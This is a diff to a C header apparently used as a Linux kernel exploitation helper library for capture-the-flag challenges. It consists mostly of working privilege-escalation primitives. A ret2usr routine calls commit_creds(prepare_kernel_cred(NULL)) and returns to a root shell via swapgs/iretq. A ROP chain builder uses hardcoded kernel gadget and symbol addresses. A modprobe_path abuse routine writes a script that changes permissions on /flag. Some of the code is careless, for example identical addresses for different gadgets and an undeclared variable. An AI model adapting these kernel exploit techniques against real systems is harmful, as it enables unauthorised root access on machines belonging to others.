@@ -55,8 +55,13 @@ typedef unsigned char u8;
 size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
 size_t leak;
 
+void error(const char *msg){
+    printf(ERROR_MSG("[!] %s\n"), msg);
+    exit(-1);
+}
+
 void spawn_shell() {
-    info("Hello from user land!");
+    log_info("Hello from user land!");
     uid_t uid = getuid();
     if (uid == 0) {
         printf(SUCCESS_MSG("[+] UID: %d, got root!\n"), uid);
@@ -83,11 +88,12 @@ void save_state() {
 }
 
 
+    // ret2usr
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
 void* (*prepare_kernel_cred_kfunc)(void *task_struct);
 int (*commit_creds_kfunc)(void *cred);
 
-// ret2usr
-size_t commit_creds = 0, prepare_kernel_cred = 0;
 
 void ret2usr_attack(void)
 {
@@ -97,20 +103,61 @@ void ret2usr_attack(void)
     (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));
 
     asm volatile(
-        "mov rax, user_ss;"
-        "push rax;"
-        "mov rax, user_sp;"
-        "sub rax, 8;"   /* stack balance */
-        "push rax;"
-        "mov rax, user_rflags;"
-        "push rax;"
-        "mov rax, user_cs;"
-        "push rax;"
-        "lea rax, spawn_shell;"
-        "push rax;"
-        "swapgs;"
-        "iretq;"
+        "mov %%rax, %[ss]\n\t"
+        "push %%rax\n\t"
+        "mov %%rax, %[sp]\n\t"
+        "sub %%rax, 8\n\t"     // stack alignment
+        "push %%rax\n\t"
+        "mov %%rax, %[rflags]\n\t"
+        "push %%rax\n\t"
+        "mov %%rax, %[cs]\n\t"
+        "push %%rax\n\t"
+        "mov %%rax, %[rip]\n\t"
+        "push %%rax\n\t"
+        "swapgs\n\t"
+        "iretq\n\t"
+        :
+        : [ss]"r"(user_ss),
+        [sp]"r"(user_sp),
+        [rflags]"r"(user_rflags),
+        [cs]"r"(user_cs),
+        [rip]"r"(spawn_shell)
+        : "rax"
     );
+}
+
+size_t *rop_commit(offset) {
+    size_t pop_rdi = KADDR(0xffffffff8104b80d);
+    size_t pop_rsi = KADDR(0xffffffff8104b80d);
+    size_t pop_rcx = KADDR(0xffffffff8104b80d);
+    size_t mov_rdi_rax = KADDR(0xffffffff8104b80d);
+
+    size_t prepare_kernel_cred = KADDR(0xffffffff810b9c20);
+    size_t commit_creds = KADDR(0xffffffff810b9970);
+    size_t init_cred = KADDR(0xffffffff82a52fc0);
+    size_t swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff8200180c);
+
+    static size_t fuzz[100] = {0};
+    i = offset;
+
+    fuzz[i++] = pop_rdi;
+    fuzz[i++] = 0;
+    fuzz[i++] = prepare_kernel_cred;
+    fuzz[i++] = pop_rcx;
+    fuzz[i++] = 1;
+    fuzz[i++] = pop_rsi;
+    fuzz[i++] = 20;
+    fuzz[i++] = mov_rdi_rax;
+    fuzz[i++] = commit_creds;
+    fuzz[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
+    fuzz[i++] = 0;
+    fuzz[i++] = 0;
+    fuzz[i++] = spawn_shell;
+    fuzz[i++] = user_cs;
+    fuzz[i++] = user_rflags;
+    fuzz[i++] = user_sp;
+    fuzz[i++] = user_ss;
+    return fuzz;
 }
 
 
@@ -122,7 +169,7 @@ void abuse_modprobe(char *filename) {
     char *arb_exec = "#!/bin/sh\n"
     "chmod 777 /flag";
 
-    info("Hello from user land!");
+    log_info("Hello from user land!");
     if (stat("/tmp", &st) == -1) {
         log_info("[*] Creating /tmp");
         int ret = mkdir("/tmp", S_IRWXU);
@@ -182,10 +229,6 @@ void info(const char *msg, unsigned long val){
     printf(INFO_MSG("[*] %s: %p\n"), msg, val);
 }
 
-void error(const char *msg){
-    printf(ERROR_MSG("[!] %s\n"), msg);
-    exit(-1);
-}
 
 
 #endif /* LIBPWN_H */
